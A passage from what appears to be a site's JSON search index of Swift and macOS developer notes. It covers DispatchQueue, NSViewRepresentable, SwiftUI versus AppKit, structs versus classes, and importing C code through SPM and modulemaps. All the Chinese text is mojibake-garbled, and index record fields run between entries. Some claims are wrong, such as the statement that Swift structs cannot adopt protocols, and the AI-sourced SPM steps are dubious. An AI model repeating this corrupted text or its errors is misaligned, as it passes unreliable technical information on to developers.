Queueï¼ˆä¸²è¡Œé˜Ÿåˆ—ï¼‰ï¼šæ¯æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªä»»åŠ¡ï¼ŒæŒ‰ç…§ä»»åŠ¡æ·»åŠ çš„é¡ºåºè¿›è¡Œæ‰§è¡Œã€‚åä¸€ä¸ªä»»åŠ¡ä¼šç­‰å¾…å‰ä¸€ä¸ªä»»åŠ¡å®Œæˆåæ‰èƒ½å¼€å§‹æ‰§è¡Œã€‚ Concurrent Queueï¼ˆå¹¶å‘é˜Ÿåˆ—ï¼‰ï¼šå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šä¸ªä»»åŠ¡ï¼Œå¹¶ä¸”ä»»åŠ¡çš„æ‰§è¡Œé¡ºåºå¯èƒ½ä¸ç¡®å®šã€‚ ä½ å¯ä»¥ä½¿ç”¨ DispatchQueue æ¥æ‰§è¡Œä»¥ä¸‹ç±»å‹çš„ä»»åŠ¡ï¼š åŒæ­¥ä»»åŠ¡ï¼ˆSync Tasksï¼‰ï¼šä»»åŠ¡ä¼šåœ¨å½“å‰çº¿ç¨‹ä¸­åŒæ­¥æ‰§è¡Œï¼Œç›´åˆ°ä»»åŠ¡æ‰§è¡Œå®Œæ¯•åæ‰ä¼šç»§ç»­æ‰§è¡Œåç»­ä»£ç ã€‚ å¼‚æ­¥ä»»åŠ¡ï¼ˆAsync Tasksï¼‰ï¼šä»»åŠ¡ä¼šåœ¨åå°çº¿ç¨‹ä¸­å¼‚æ­¥æ‰§è¡Œï¼Œä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹çš„æ‰§è¡Œï¼Œå¯ä»¥ç»§ç»­æ‰§è¡Œåç»­ä»£ç ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ DispatchQueue çš„ç®€å•ç¤ºä¾‹: let queue = DispatchQueue(label: \"com.example.queue\") // å¼‚æ­¥ä»»åŠ¡ queue.async { // åœ¨åå°çº¿ç¨‹æ‰§è¡Œçš„ä»»åŠ¡ print(\"å¼‚æ­¥ä»»åŠ¡\") } // åŒæ­¥ä»»åŠ¡ queue.sync { // åœ¨å½“å‰çº¿ç¨‹æ‰§è¡Œçš„ä»»åŠ¡ print(\"åŒæ­¥ä»»åŠ¡\") } DispatchQueue è¿˜æä¾›äº†å…¶ä»–åŠŸèƒ½ï¼Œå¦‚å»¶è¿Ÿæ‰§è¡Œä»»åŠ¡ã€è°ƒåº¦ä»»åŠ¡åœ¨ç‰¹å®šæ—¶é—´æˆ–é—´éš”åæ‰§è¡Œç­‰ã€‚ å®ƒæ˜¯åœ¨iOSã€macOSã€watchOS å’Œ tvOS å¼€å‘ä¸­è¿›è¡Œå¼‚æ­¥å’Œå¹¶å‘ç¼–ç¨‹çš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚ æ¯”å¦‚å»¶æ—¶æ‰§è¡Œä¹Ÿå¯ä»¥: // å»¶æ—¶æ‰§è¡Œä»»åŠ¡ DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { // 2ç§’åæ‰§è¡Œçš„ä»»åŠ¡ print(\"å»¶æ—¶æ‰§è¡Œçš„ä»»åŠ¡\") } NSViewRepresentable ä¸€ä¸ªåè®®ï¼Œç”¨äºåœ¨SwiftUIä¸­å°è£…å’Œä½¿ç”¨Cocoaï¼ˆmacOSï¼‰ä¸­çš„NSViewã€‚ å®ƒå…è®¸å¼€å‘è€…é€šè¿‡å®ç°ä¸€äº›å¿…è¦çš„æ–¹æ³•æ¥åˆ›å»ºè‡ªå®šä¹‰çš„NSViewï¼Œå¹¶å°†å…¶åµŒå…¥åˆ°SwiftUIè§†å›¾å±‚çº§ä¸­ã€‚ é€šè¿‡éµå¾ªNSViewRepresentableåè®®ï¼Œ ä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªéµå¾ªNSViewRepresentableåè®®çš„è‡ªå®šä¹‰ç»“æ„ä½“æˆ–ç±»ï¼Œç„¶åå®ç°ä»¥ä¸‹ä¸¤ä¸ªå¿…è¦çš„æ–¹æ³•ï¼š makeNSView(context:)ï¼šåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œä½ éœ€è¦åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªNSViewå®ä¾‹ã€‚è¿™ä¸ªæ–¹æ³•ä¼šåœ¨è§†å›¾ç¬¬ä¸€æ¬¡è¢«åˆ›å»ºæ—¶è°ƒç”¨ã€‚ updateNSView(_:context:)ï¼šåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œä½ å¯ä»¥æ ¹æ®éœ€è¦æ›´æ–°NSViewçš„å±æ€§å’Œå†…å®¹ã€‚è¿™ä¸ªæ–¹æ³•ä¼šåœ¨è§†å›¾çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶è¢«è°ƒç”¨ã€‚ é€šè¿‡å®ç°è¿™äº›æ–¹æ³•ï¼Œä½ å¯ä»¥åœ¨SwiftUIä¸­ä½¿ç”¨è‡ªå®šä¹‰çš„NSViewï¼Œ å¹¶åœ¨å…¶ä¸­ä½¿ç”¨Cocoaï¼ˆmacOSï¼‰æä¾›çš„å„ç§åŠŸèƒ½å’Œæ§ä»¶ï¼Œä»¥æ»¡è¶³ç‰¹å®šçš„éœ€æ±‚ã€‚ View è§†å›¾é¡¶çº§çª—å£, æ³¨æ„, æ²¡æœ‰æä¾›é»˜è®¤çš„closeæ–¹æ³•, å› ä¸ºå®˜æ–¹è§‰å¾—closeä¸åº”è¯¥ç”±Viewè§¦å‘ å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç è·å–åˆ°Viewæ‰€åœ¨çª—ä½“ç„¶åå…³é—­: NSWindow(contentViewController: NSHostingController(rootView: self)) NSWindow AppKitçš„çª—å£ç®¡ç† NSHostingController AppKit ä¸­çš„ç±»ï¼Œç”¨äºåœ¨ macOS åº”ç”¨ç¨‹åºä¸­æ‰¿è½½ SwiftUI è§†å›¾ã€‚ å®ƒæ˜¯ä¸€ä¸ª AppKit è§†å›¾æ§åˆ¶å™¨ï¼Œç”¨äºåœ¨ AppKit åº”ç”¨ç¨‹åºä¸­æ‰˜ç®¡å’Œç®¡ç† SwiftUI è§†å›¾ã€‚ é€šè¿‡å°† SwiftUI è§†å›¾åµŒå…¥åˆ° NSHostingController ä¸­ï¼Œå¯ä»¥åœ¨ AppKit åº”ç”¨ç¨‹åºçš„è§†å›¾å±‚æ¬¡ç»“æ„ä¸­ä½¿ç”¨ SwiftUI è§†å›¾ã€‚ ZStackä¸VStack ZStack ä¸€ä¸ª3Dçš„å¸ƒå±€æ–¹å¼, æ¯”å¦‚æœ‰ä¸‰ä¸ªå›¾æ ‡, åè€…ä¼šå æ”¾åœ¨å‰è€…ä¸Š VStack å‚ç›´å¸ƒå±€æ–¹å¼, æ¯”å¦‚æœ‰ä¸‰ä¸ªå›¾æ ‡, åè€…ä¼šå‚ç›´æ’åˆ—ä¸å‰è€… æ”¯æŒçš„å— Settings å— ç”¨äºå®šä¹‰åº”ç”¨ç¨‹åºçš„è®¾ç½®åœºæ™¯ï¼Œå®ƒæ˜¯ä¸€ä¸ªè§†å›¾æ„é€ å™¨ï¼Œç”¨äºè‡ªå®šä¹‰åº”ç”¨ç¨‹åºçš„è®¾ç½®ç•Œé¢ã€‚ é€šè¿‡åœ¨ Settings å—ä¸­æ·»åŠ è§†å›¾æ¥åˆ›å»ºè‡ªå®šä¹‰çš„è®¾ç½®ç•Œé¢ï¼Œä»¥ä¾›ç”¨æˆ·é…ç½®å’Œè°ƒæ•´åº”ç”¨ç¨‹åºçš„å„ç§é€‰é¡¹ã€‚ WindowGroup å— WindowGroup å—ç”¨äºå®šä¹‰åº”ç”¨ç¨‹åºçš„ä¸»çª—å£åœºæ™¯ã€‚ åœ¨ WindowGroup å—ä¸­ï¼Œä½ å¯ä»¥æŒ‡å®šåº”ç”¨ç¨‹åºçš„ä¸»çª—å£çš„å†…å®¹è§†å›¾ä»¥åŠå…¶ä»–ä¸çª—å£ç›¸å…³çš„å±æ€§ã€‚ Scene å— Scene å—ç”¨äºå®šä¹‰åº”ç”¨ç¨‹åºçš„åœºæ™¯ï¼Œå®ƒå¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªçª—å£ç»„ã€‚ ä½ å¯ä»¥åœ¨ Scene å—ä¸­å®šä¹‰åº”ç”¨ç¨‹åºçš„åœºæ™¯é…ç½®ã€çª—å£ç®¡ç†å’Œç”Ÿå‘½å‘¨æœŸå¤„ç†ã€‚ NavigationView å— NavigationView å—ç”¨äºåˆ›å»ºå…·æœ‰å¯¼èˆªåŠŸèƒ½çš„è§†å›¾å±‚æ¬¡ç»“æ„ã€‚ åœ¨ NavigationView å—ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ NavigationView çš„ä¿®é¥°ç¬¦å’Œå­è§†å›¾æ¥å®šä¹‰å¯¼èˆªæ ã€å¯¼èˆªé“¾æ¥ä»¥åŠå…¶ä»–ä¸å¯¼èˆªç›¸å…³çš„ç•Œé¢å…ƒç´ ã€‚ Form å— Form å—ç”¨äºåˆ›å»ºè¡¨å•è§†å›¾ï¼Œç”¨äºæ˜¾ç¤ºå’Œæ”¶é›†ç”¨æˆ·çš„è¾“å…¥ã€‚ åœ¨ Form å—ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ Form çš„ä¿®é¥°ç¬¦å’Œå­è§†å›¾æ¥åˆ›å»ºè¡¨å•å­—æ®µã€åˆ†ç»„å’Œå…¶ä»–ä¸è¡¨å•ç›¸å…³çš„ç•Œé¢å…ƒç´ ã€‚ List å— List å—ç”¨äºåˆ›å»ºå¯æ»šåŠ¨çš„åˆ—è¡¨è§†å›¾ã€‚ åœ¨ List å—ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ List çš„ä¿®é¥°ç¬¦å’Œå­è§†å›¾æ¥å®šä¹‰åˆ—è¡¨é¡¹ã€åˆ†ç»„å’Œå…¶ä»–ä¸åˆ—è¡¨ç›¸å…³çš„ç•Œé¢å…ƒç´ ã€‚ ForEach å— ForEach å—ç”¨äºåœ¨åˆ—è¡¨æˆ–è§†å›¾ä¸­è¿­ä»£å’Œæ˜¾ç¤ºé›†åˆä¸­çš„å…ƒç´ ã€‚ åœ¨ ForEach å—ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ ForEach çš„ä¿®é¥°ç¬¦å’Œå­è§†å›¾æ¥å®šä¹‰æ¯ä¸ªå…ƒç´ çš„æ˜¾ç¤ºæ–¹å¼å’Œäº¤äº’è¡Œä¸ºã€‚ SwiftUI ä¸ AppKit SwiftUI å’Œ AppKit æ˜¯ Apple æä¾›çš„ä¸¤ä¸ªä¸åŒçš„æ¡†æ¶ï¼Œ ç”¨äºæ„å»º macOS åº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢ã€‚å®ƒä»¬åœ¨è®¾è®¡å’Œå¼€å‘ç†å¿µä¸Šæœ‰ä¸€äº›åŒºåˆ«ã€‚ å£°æ˜æ€§ UIï¼šSwiftUI æ˜¯ä¸€ä¸ªåŸºäºå£°æ˜æ€§ UI çš„æ¡†æ¶ï¼Œ å®ƒä½¿ç”¨ç®€æ´çš„ä»£ç å’Œå£°æ˜å¼çš„æ–¹å¼æ¥æè¿°ç”¨æˆ·ç•Œé¢ã€‚ ä½ å¯ä»¥ä½¿ç”¨ SwiftUI çš„å„ç§è§†å›¾å’Œä¿®é¥°ç¬¦æ¥æ„å»ºç”¨æˆ·ç•Œé¢ï¼Œ å¹¶ä¸”å®ƒä¼šè‡ªåŠ¨å¤„ç†è§†å›¾çŠ¶æ€å’Œå¸ƒå±€ï¼Œä»¥åŠä¸ç”¨æˆ·äº¤äº’çš„å“åº”ã€‚ è€Œ AppKit æ˜¯ä¸€ä¸ªåŸºäºå‘½ä»¤å¼çš„ UI æ¡†æ¶ï¼Œä½ éœ€è¦ç¼–å†™æ›´å¤šçš„ä»£ç æ¥æ‰‹åŠ¨ç®¡ç†è§†å›¾çš„çŠ¶æ€å’Œå¸ƒå±€ã€‚ è·¨å¹³å°æ”¯æŒï¼šSwiftUI æ˜¯ä¸€ä¸ªè·¨å¹³å°æ¡†æ¶ï¼Œ é™¤äº† macOSï¼Œå®ƒè¿˜å¯ä»¥ç”¨äºæ„å»º iOSã€iPadOSã€watchOS å’Œ tvOS åº”ç”¨ç¨‹åºã€‚ è¿™æ„å‘³ç€ä½ å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ä»£ç å’ŒæŠ€æœ¯æ¥å¼€å‘å¤šä¸ªå¹³å°ä¸Šçš„åº”ç”¨ç¨‹åºã€‚ è€Œ AppKit æ˜¯ä¸“é—¨ä¸º macOS è®¾è®¡çš„æ¡†æ¶ï¼Œä¸æ”¯æŒå…¶ä»–å¹³å°ã€‚ å“åº”å¼å¸ƒå±€ï¼šSwiftUI çš„å¸ƒå±€ç³»ç»Ÿæ˜¯å“åº”å¼çš„ï¼Œ å®ƒä½¿ç”¨äº†ä¸€ç§å«åš \"å®¹å™¨è§†å›¾\" çš„æ¦‚å¿µï¼Œå¯ä»¥è‡ªåŠ¨é€‚åº”ä¸åŒçš„å±å¹•å°ºå¯¸å’Œè®¾å¤‡æ–¹å‘ã€‚ è¿™ä½¿å¾—å¼€å‘é€‚åº”æ€§æ›´å¼ºçš„ç”¨æˆ·ç•Œé¢å˜å¾—æ›´åŠ å®¹æ˜“ã€‚ AppKit çš„å¸ƒå±€ç³»ç»Ÿç›¸å¯¹è¾ƒä¸ºä¼ ç»Ÿï¼Œéœ€è¦æ‰‹åŠ¨å¤„ç†ä¸åŒçš„å±å¹•å°ºå¯¸å’Œè®¾å¤‡æ–¹å‘ã€‚ é¢„è§ˆåŠŸèƒ½ï¼šSwiftUI æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„é¢„è§ˆåŠŸèƒ½ï¼Œå¯ä»¥åœ¨å¼€å‘è¿‡ç¨‹ä¸­å®æ—¶é¢„è§ˆå’Œè°ƒè¯•ç”¨æˆ·ç•Œé¢ã€‚ ä½ å¯ä»¥åœ¨ Xcode ä¸­æŸ¥çœ‹ SwiftUI è§†å›¾åœ¨ä¸åŒè®¾å¤‡ä¸Šçš„å¤–è§‚ï¼Œå¹¶å³æ—¶æŸ¥çœ‹ä»£ç æ›´æ”¹çš„æ•ˆæœã€‚ è¿™å¯¹äºè¿­ä»£å¼€å‘å’Œå¿«é€Ÿè°ƒè¯•éå¸¸æœ‰å¸®åŠ©ã€‚AppKit å¹¶æ²¡æœ‰æä¾›ç±»ä¼¼çš„é¢„è§ˆåŠŸèƒ½ã€‚ å°½ç®¡ SwiftUI åœ¨è®¾è®¡ä¸Šæœ‰ä¸€äº›æ–°é¢–çš„æ¦‚å¿µå’Œä¼˜åŠ¿ï¼Œ ä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»ç„¶éœ€è¦ä½¿ç”¨ AppKit æ¥æ„å»ºæ›´å¤æ‚å’Œå®šåˆ¶åŒ–çš„ macOS åº”ç”¨ç¨‹åºã€‚ AppKit æ‹¥æœ‰æ›´å¤šçš„åŠŸèƒ½å’Œçµæ´»æ€§","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Official-library.html","loc":"/yq-doc-source-docs-rear-end-swift-Official-library.html"},{"title":"swift3.xå‡çº§åˆ°5.x","text":"å…ˆå» App Store ä¸‹è½½ Swiftify for Xcode : https://apps.apple.com/cn/app/swiftify-for-xcode/id1183412116?mt=12 å…ˆæ³¨å†Œ: https://swiftify.com/profile/api-key/ ä¸»è¦æ˜¯è¦è·å–ä¸€ä¸ªAPI KEY é…ç½®: ç³»ç»Ÿåå¥½è®¾ç½® => \"æ‰©å±•\"ä¸­ä¸ºXcode Source Editor(Xcodeæºç ç¼–è¾‘å™¨)é€‰æ‹©\"Swiftyfy for Xcode\" æ‰“å¼€Xcode => Editor => èœå•ä¸‹çœ‹åˆ°æ–°çš„\"Swiftify\"å­èœå• å¥½å§ä¸è¡Œ, å‘, è¿™æ˜¯ object-c => swift çš„","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-SWIFT3.X-upgrades-to-5.x.html","loc":"/yq-doc-source-docs-rear-end-swift-SWIFT3.X-upgrades-to-5.x.html"},{"title":"swiftç»“æ„ä½“ä¸ç±»çš„ä½¿ç”¨åŒºåˆ«","text":"ç»“æ„ä½“: å€¼ç±»å‹, å½“ä½ åˆ›å»ºç»“æ„ä½“çš„å®ä¾‹æ—¶ï¼Œå®ƒä¼šåˆ›å»ºè¯¥ç»“æ„çš„æ·±æ‹·è´; å³ä½¿å°†å…¶èµ‹å€¼ç»™å…¶ä»–å˜é‡, ä¹Ÿæ˜¯åˆ›å»ºä¸€ä¸ªå€¼çš„æ‹·è´ ç»“æ„ä½“çš„æˆå‘˜é»˜è®¤æ˜¯ä¸å¯å˜çš„ï¼ˆimmutableï¼‰ï¼Œé™¤éä½ æ˜ç¡®åœ°ä½¿ç”¨å…³é”®å­—mutatingæ¥æ ‡è®° ç»“æ„ä½“ä¸èƒ½ç»§æ‰¿è‡ªå…¶ä»–ç»“æ„ä½“æˆ–ç±»ï¼Œä¹Ÿä¸èƒ½å®ç°åè®®ï¼ˆprotocolï¼‰ã€‚ ä½†æ˜¯ï¼Œä½ å¯ä»¥åœ¨ç»“æ„ä½“ä¸­å®šä¹‰ä¸€ä¸ªåä¸ºinitçš„å‡½æ•°æ¥å®ç°åˆå§‹åŒ–é€»è¾‘ã€‚ ç±» å¼•ç”¨ç±»å‹, å½“ä½ åˆ›å»ºç±»çš„å®ä¾‹æ—¶ï¼Œå®ƒåˆ›å»ºçš„æ˜¯å¯¹ç±»ç±»å‹çš„å¼•ç”¨(å¤šä¸ªå¼•ç”¨æ‰§è¡ŒåŒä¸€ä¸ªå€¼) ç±»çš„æˆå‘˜é»˜è®¤æ˜¯å¯å˜çš„ï¼ˆmutableï¼‰ ç±»å¯ä»¥ç»§æ‰¿è‡ªå…¶ä»–ç±»æˆ–å®ç°åè®® ä½¿ç”¨åœºæ™¯ ç»“æ„ä½“ï¼šç»“æ„ä½“é€šå¸¸ç”¨äºè¡¨ç¤ºç®€å•çš„æ•°æ®æ¨¡å‹ï¼Œ å¦‚å‡ ä½•å½¢çŠ¶æˆ–è´§å¸å•ä½ï¼Œå…¶ä¸­é‡ç‚¹æ˜¯æ•°æ®è€Œä¸æ˜¯è¡Œä¸ºã€‚ ç»“æ„ä½“çš„è¡Œä¸ºé€šå¸¸é€šè¿‡å‡½æ•°å’Œè®¡ç®—å±æ€§æ¥å®šä¹‰ã€‚ ç±»ï¼šç±»é€šå¸¸ç”¨äºè¡¨ç¤ºæ›´å¤æ‚çš„æ¦‚å¿µï¼Œ å¦‚äººç±»ã€åŠ¨ç‰©æˆ–æ±½è½¦ç­‰ï¼Œå…¶ä¸­é‡ç‚¹æ˜¯è¡Œä¸ºå’ŒçŠ¶æ€ã€‚ ç±»å¯ä»¥æ‹¥æœ‰å®ä¾‹æ–¹æ³•å’Œç±»æ–¹æ³•ï¼Œä»¥åŠå±æ€§ï¼ˆå¯ä»¥æ˜¯å¯å˜çš„æˆ–ä¸å¯å˜çš„ï¼‰ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Swift-structure-and-class-difference.html","loc":"/yq-doc-source-docs-rear-end-swift-Swift-structure-and-class-difference.html"},{"title":"ä¸€äº›å¥½ç”¨ä¸‰æ–¹åº“","text":"KeyboardShortcuts é”®ç›˜äº‹ä»¶å¤„ç†åº“: https://swiftpackageindex.com/sindresorhus/KeyboardShortcuts æ”¯æŒå…¨å±€å¿«æ·é”®çš„ç›‘å¬, å®Œç¾æ”¯æŒMacOSçš„æ²™ç›’","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Three--party-library.html","loc":"/yq-doc-source-docs-rear-end-swift-Three--party-library.html"},{"title":"ä½¿ç”¨SPM(Swift Package Manager)","text":"Swift Package Manager (SPM) æ³¨è§£ æºäºAI, æœ‰ç©ºæ•´ç† å¦‚æœä½ æƒ³åœ¨ Swift Package Manager (SPM) ä¸­å¯¼å…¥ C ä»£ç ï¼Œä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š åˆ›å»º Swift åŒ… åœ¨ä½ çš„é¡¹ç›®ç›®å½•ä¸­ï¼Œæ‰“å¼€ç»ˆç«¯æˆ–å‘½ä»¤æç¤ºç¬¦ã€‚ ä½¿ç”¨ cd å‘½ä»¤å¯¼èˆªåˆ°ä½ çš„é¡¹ç›®ç›®å½•ã€‚ è¿è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„ Swift åŒ…: swift package init æˆ–è€…ç›´æ¥åœ¨xcodeåˆ›å»º é…ç½® Swift åŒ… åœ¨é¡¹ç›®ç›®å½•ä¸­ï¼Œä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ Package.swift æ–‡ä»¶ã€‚ åœ¨ Package.swift æ–‡ä»¶ä¸­ï¼Œé…ç½® Swift åŒ…çš„åç§°ã€ç›®æ ‡å’Œä¾èµ–é¡¹ç­‰ä¿¡æ¯ã€‚ åœ¨ targets æ•°ç»„ä¸­ï¼Œå®šä¹‰ä½ çš„ç›®æ ‡åŠå…¶ç›¸å…³è®¾ç½®ï¼Œä¾‹å¦‚æ¨¡å—åç§°ã€æºæ–‡ä»¶è·¯å¾„ç­‰ã€‚ åœ¨ Swift åŒ…ä¸­åˆ›å»º C æºæ–‡ä»¶ åœ¨ä½ çš„ Swift åŒ…ç›®å½•ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªåŒ…å« C ä»£ç çš„æºæ–‡ä»¶ï¼Œä¾‹å¦‚ YourPackage/Sources/YourPackage/CFile.cã€‚ åœ¨ C æºæ–‡ä»¶ä¸­ï¼Œç¼–å†™ä½ çš„ C ä»£ç ã€‚ æ›´æ–° Swift åŒ…é…ç½®æ–‡ä»¶ åœ¨ Package.swift æ–‡ä»¶ä¸­ï¼Œå°† C æºæ–‡ä»¶æ·»åŠ åˆ° Swift åŒ…çš„ç›®æ ‡ä¸­ã€‚ ä¿®æ”¹ targets æ•°ç»„ä¸­çš„ç›®æ ‡é…ç½®ï¼Œæ·»åŠ  C æºæ–‡ä»¶çš„è·¯å¾„: // Package.swift // ... targets: [ .target( name: \"YourPackage\", dependencies: [], cSettings: [ .headerSearchPath(\"YourPackage/Sources/YourPackage\"), .unsafeFlags([\"-Xclang\", \"-fmodule-map-file=YourPackage/Sources/YourPackage/module.modulemap\"]), ] ), // ... ], åˆ›å»ºæ¨¡å—æ˜ å°„æ–‡ä»¶ åœ¨ Swift åŒ…ç›®å½•ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º module.modulemap çš„æ¨¡å—æ˜ å°„æ–‡ä»¶ï¼Œ ä¾‹å¦‚ YourPackage/Sources/YourPackage/module.modulemapã€‚ åœ¨æ¨¡å—æ˜ å°„æ–‡ä»¶ä¸­ï¼ŒæŒ‡å®šä½ çš„ C æºæ–‡ä»¶çš„å¯¼å…¥æ–¹å¼: // module.modulemap module YourPackage [system] { header \"CFile.h\" export * } å¯¼å…¥ C ä»£ç  åœ¨ä½ çš„ Swift ä»£ç ä¸­ï¼Œä½¿ç”¨ import è¯­å¥å¯¼å…¥ä½ çš„ Swift åŒ…ã€‚ ç°åœ¨ä½ å¯ä»¥åœ¨ Swift ä»£ç ä¸­ä½¿ç”¨å¯¼å…¥çš„æ¨¡å—å’Œå…¶ä¸­çš„ C ä»£ç : // Swift ä»£ç  import YourPackage // ä½¿ç”¨å¯¼å…¥çš„æ¨¡å—å’Œå…¶ä¸­çš„ C ä»£ç  é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œä½ å¯ä»¥ä½¿ç”¨ Swift Package Manager å¯¼å…¥å’Œä½¿ç”¨ C ä»£ç ã€‚ ç¡®ä¿åœ¨ Swift åŒ…çš„é…ç½®æ–‡ä»¶ä¸­æ­£ç¡®æŒ‡å®šäº† C æºæ–‡ä»¶çš„è·¯å¾„ï¼Œå¹¶ä½¿ç”¨æ¨¡å—æ˜ å°„æ–‡ä»¶æ¥å®šä¹‰å¯¼å…¥æ–¹å¼ã€‚ è¯·æ³¨æ„ï¼Œä½¿ç”¨ Swift Package Manager å¯¼å…¥ C ä»£ç éœ€è¦é€‚å½“çš„é…ç½®å’Œç›®å½•ç»“æ„ï¼Œ å¹¶ä¸”éœ€è¦åœ¨æ¨¡å—æ˜ å°„æ–‡ä»¶ä¸­æ­£ç¡®å®šä¹‰ C æºæ–‡ä»¶çš„å¯¼å…¥æ–¹å¼ã€‚ ç¡®ä¿ä½ çš„ C ä»£ç å¯ä»¥æ­£ç¡®ç¼–è¯‘å’Œé“¾æ¥ï¼Œå¹¶åœ¨ Swift ä»£ç ä¸­æŒ‰ç…§é€‚å½“çš„æ–¹å¼ä½¿ç”¨ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Use-SPM-(Swift-Package-Manager).html","loc":"/yq-doc-source-docs-rear-end-swift-Use-SPM-(Swift-Package-Manager).html"},{"title":"ä½¿ç”¨modulemapå¯¼å…¥C++æ¡†æ¶","text":"è‡ªå·±ä½¿ç”¨modulemapåªå¯¼å…¥æŸä¸€ä¸ªå¤´æ–‡ä»¶, æ–‡ä»¶æ˜¯ä½äºSDKåº“çš„ libproc.h , å¥ˆä½•ä¸€ç›´å¤±è´¥, æ•…æ”¾å¼ƒ.... è´´ä¸€äº›ç›¸å…³çš„èµ„æ–™: Importing Headers from a C++ Package Target Mixing Languages in an Xcode project Importing C++ into Swift åæ­£æ˜¯çœ‹äº†ä¸€åœˆ, å¥½åƒæ²¡ç›´æ¥æ”¯æŒçš„, å¦‚æœè¦æ‹¿å‡ºæ¥å¼„æˆtargetæˆ–è€…æ¡†æ¶å•¥çš„, å°±å¥½éº»çƒ¦, æ¯•ç«Ÿåªéœ€è¦å¯¼é‚£ä¸€ä¸ª..., æš‚æ—¶å…ˆæ¡¥æ¥å¤„ç†å§ ä½¿ç”¨modulemap å¤§è‡´ä¸¤æ­¥æµç¨‹ ç¼–å†™ modulemap æ–‡ä»¶, å‘½åä¸º module.modulemap (åœ¨xcodeæ–°å»ºä¼šè‡ªå¸¦åç¼€) åœ¨ TARGETS ä¸‹é…ç½® Swift Compiler - Search Paths ä¸ºmodulemapæ–‡ä»¶æ‰€åœ¨ç›®å½• è¯¦ç»†è¯´æ˜ modulemap ä¸æ­¢å¯ä»¥ä½¿ç”¨åœ¨ C++, ä¹Ÿå¯ä»¥æ˜¯C, ä¹Ÿä¸æ­¢æ˜¯åŒ…å’Œæ¡†æ¶, è¿˜å¯ä»¥ç›´æ¥åœ¨å½“å‰é¡¹ç›®å†…ç›´æ¥æ–°æ‹‰ä¸€ä¸ªç»„ç”¨, ä½†æ˜¯æœ€é‡è¦çš„ä¸€ç‚¹, æ–‡ä»¶ååªèƒ½å®šä¹‰ä¸º `module` å¦å¤–éœ€é…ç½® Swift Compiler - Search Paths ä¸ºmodulemapæ–‡ä»¶æ‰€åœ¨ç›®å½•, ä»¥æ ¹ç›®å½•ä¸‹ Modules/module.modulemap ä¸ºä¾‹ (ä¸”ä¸€å®šè¦é€‰ TARGETS è€Œä¸æ˜¯ PROJECT ): $(SRCROOT)/Modules é‡è¦ modulemapæ–‡ä»¶ååªèƒ½å« module module.modulemapå†…å®¹ç¤ºä¾‹: module ProcInfo { header \"tt.h\" export * } å…¶ä»–è¯´æ˜ æœ‰ä¸ªæ–°çš„é—®é¢˜, å°±æ˜¯åœ¨è‡ªå®šä¹‰çš„å¤´æ–‡ä»¶, æ— æ³•å¯¼å…¥å…¶ä»–å¤´æ–‡ä»¶å¹¶æ­£å¸¸ä½¿ç”¨, ä»¥å¯¼å…¥SDKåº“çš„libprocä¸ºä¾‹: // tt.h #ifndef tt_h #define tt_h //#include <libproc.h> //#import <libproc.h> #import </Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk/usr/include/libproc.h> // ä¸çŸ¥é“ä¸ºå•¥, å°±æ˜¯æ‰¾ä¸åˆ°sdkåŒ…é‡Œé¢çš„ libproc... #define NAME \"YQ\" #define NAME2 \"YQ\" #define PROC_PIDPATHINFO_MAXSIZE PROC_PIDPATHINFO_MAXSIZE #define PROC_Q_MAXSIZE PROC_PIDPATHINFO_MAXSIZE #define SIZEYQ \"PROC_PIDPATHINFO_MAXSIZE\" #endif /* tt_h */ ä¸ç®¡ import æ€ä¹ˆå†™, ä¸ç®¡åœ¨ header pathæ€ä¹ˆè®¾ç½®, å“ªæ€•æ˜¯ç›´æ¥å¯¼å…¥ç»å¯¹è·¯å¾„, cmd + click éƒ½æ‰¾ä¸åˆ°... æœ€åå°è¯•äº†ä¸€ä¸‹åœ¨swiftä¸­ä½¿ç”¨, å‘ç°ä¸€ä¸ªé—®é¢˜, å°±æ˜¯è™½ç„¶å¤´æ–‡ä»¶ä¸­æ²¡å‘ç›´æ¥æŒ‰ä½Commandé”®å¹¶å•å‡»æ¥å¯¼èˆªåˆ°å¯¼å…¥çš„å¤´æ–‡ä»¶, ä½†æ˜¯ä»£ç ä¸­å¯ä»¥æ‹¿åˆ°éƒ¨åˆ†å€¼ æ³¨è§£ æ— æ³•é€šè¿‡ æŒ‰ä½Commandé”®å¹¶å•å‡»æ¥ è‡ªå®šä¹‰å¤´æ–‡ä»¶ä¸­å¼•å…¥çš„å¤´æ–‡ä»¶æ¥ç¡®å®šæ˜¯å¦æˆåŠŸå¯¼å…¥, 